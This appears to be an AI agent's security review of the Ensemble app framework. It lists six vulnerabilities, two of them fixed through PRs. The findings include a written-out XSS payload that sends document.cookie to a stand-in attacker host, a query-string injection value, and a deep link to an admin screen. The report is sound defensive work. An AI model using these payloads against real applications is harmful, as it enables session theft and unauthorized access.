# Application Security Review — 2026-06-24

## Summary

Two validated medium+ vulnerabilities fixed with separate branches/PRs. Four additional validated issues documented without PRs (require product/security owner input or broader architectural changes).

## Findings with fixes

### 1. invokeAPI / SSE query parameter injection — Medium

- **Location:** `modules/ensemble/lib/framework/apiproviders/http_api_provider.dart`, `sse_api_provider.dart`
- **Attacker:** External user whose input flows into API `parameters` via YAML expression evaluation (e.g. `${searchInput}`)
- **Controlled input:** Parameter values containing `&` or `=` (e.g. `foo&role=admin`)
- **Attack path:** User input → `invokeAPI` GET/DELETE parameters → unencoded URL concatenation → backend receives injected query pairs
- **Impact:** HTTP parameter pollution; may bypass filters, alter authorization checks, or change API semantics on backends with inconsistent parameter precedence
- **Remediation:** `appendEncodedQueryParameters()` using `Uri.replace(queryParameters:)`
- **PR status:** PR created — https://github.com/EnsembleUI/ensemble/pull/2301

### 2. Chart.js config injection into eval/HTML — High

- **Location:** `modules/ensemble/lib/widget/visualization/chart_js/web/chart_js_state.dart`, `modules/ensemble/lib/util/chart_utils.dart`
- **Attacker:** External party controlling API response data or user input bound to ChartJs `config`
- **Controlled input:** Malicious string such as `{});fetch('https://evil.example?c='+document.cookie);//`
- **Attack path:** Untrusted string config → interpolated into `JsWidget.scriptToInstantiate` → browser `eval()` → arbitrary JS in app origin (web); same pattern in native WebView HTML
- **Impact:** XSS on web; session/token theft; actions as the victim user within the app origin
- **Remediation:** Validate string configs as JSON via `jsonEncode(jsonDecode(...))`; preserve trusted Map configs via `configFromMap` flag; restrict chart `id` charset
- **PR status:** Fix branch pushed — `cursor/application-security-review-chartjs` / `security/fix-chartjs-eval-injection` (compare: https://github.com/EnsembleUI/ensemble/compare/main...cursor/application-security-review-chartjs). Automated second PR creation blocked by integration permissions; PR #2301 tool returned existing PR.

## Findings without PRs

### 3. OAuth/API fail-open when token missing — High

- **Location:** `http_api_provider.dart` lines 47–72
- **Attacker:** Unauthenticated user or attacker inducing auth failure (cancel OAuth, expired token)
- **Attack path:** API configured with `authorization.oauthId` → `authorize()` returns null → request sent without `Authorization` header
- **Impact:** Sensitive API calls may reach backend unauthenticated if server assumes client always attaches tokens when configured
- **Remediation:** Fail closed — abort request when authorization is configured but token resolution fails
- **PR status:** No PR created: requires owner input (may break apps relying on optional auth)

### 4. Unrestricted outbound HTTP (client-side SSRF) — Medium–High

- **Location:** `http_api_provider.dart`, `invokablefetch.dart`, `save_file.dart`
- **Attacker:** Malicious/compromised app definition author or script with expression control
- **Attack path:** Evaluated URL → `http.get/post` to internal IPs, cloud metadata, localhost
- **Impact:** Probe internal networks from user devices; exfiltrate data via attacker endpoints
- **Remediation:** URL allowlist / block RFC1918, link-local, metadata IPs on native
- **PR status:** No PR created: requires owner input (policy definition)

### 5. Server credentials stored in non-secure GetStorage — High

- **Location:** `modules/auth/lib/signin/auth_manager.dart`, `auth_context_manager.dart` (TODO in code)
- **Attacker:** Device attacker (root/jailbreak, physical access, malware)
- **Attack path:** Bearer tokens in `user.data` persisted via GetStorage
- **Impact:** Credential theft from device storage
- **Remediation:** Move server credentials to secure storage
- **PR status:** No PR created: requires owner input (auth module migration)

### 6. Deep link screen navigation without allowlist — Medium

- **Location:** `modules/ensemble/lib/deep_link_manager.dart`
- **Attacker:** Anyone who can trigger a deep link (email, QR, website)
- **Attack path:** `myapp://?screenName=AdminPanel` → `navigateToScreen` without auth gate
- **Impact:** Access screens intended to be gated by in-app navigation/auth
- **Remediation:** App-level allowlist or global script handler validation
- **PR status:** No PR created: requires owner input (per-app policy)
